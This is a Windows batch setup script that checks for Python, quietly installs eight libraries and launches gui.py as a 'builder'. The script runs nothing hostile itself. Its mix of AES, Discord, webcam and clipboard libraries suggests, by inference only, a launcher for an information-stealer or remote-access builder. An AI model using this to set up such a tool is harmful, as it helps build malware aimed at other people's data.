@echo off
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.)
    echo Make sure it is added to PATH.
    goto ERROR
)

title Downloading libraries...

echo Checking 'customtkinter' (1/8)
python -c "import customtkinter" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing customtkinter...
    python -m pip install customtkinter > nul
)

echo Checking 'pillow' (2/8)
python -c "import PIL.Image" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pillow...
    python -m pip install pillow > nul
)

echo Checking 'pyaes' (3/8)
python -c "import pyaes" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyaes...
    python -m pip install pyaes > nul
)

echo Checking 'urllib3' (4/8)
python -c "import urllib3" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing urllib3...
    python -m pip install urllib3 > nul
)

echo Checking 'pycryptodome' (5/8)
python -c "import Crypto" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pycryptodome...
    python -m pip install pycryptodome > nul
)

echo Checking 'discord.py' (6/8)
python -c "import discord" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing discord.py...
    python -m pip install discord.py > nul
)

echo Checking 'opencv-python' (7/8)
python -c "import cv2" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing opencv-python...
    python -m pip install opencv-python > nul
)

echo Checking 'pyperclip' (8/8)
python -c "import pyperclip" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyperclip...
    python -m pip install pyperclip > nul
)

cls
title Starting builder...
python gui.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul
exit
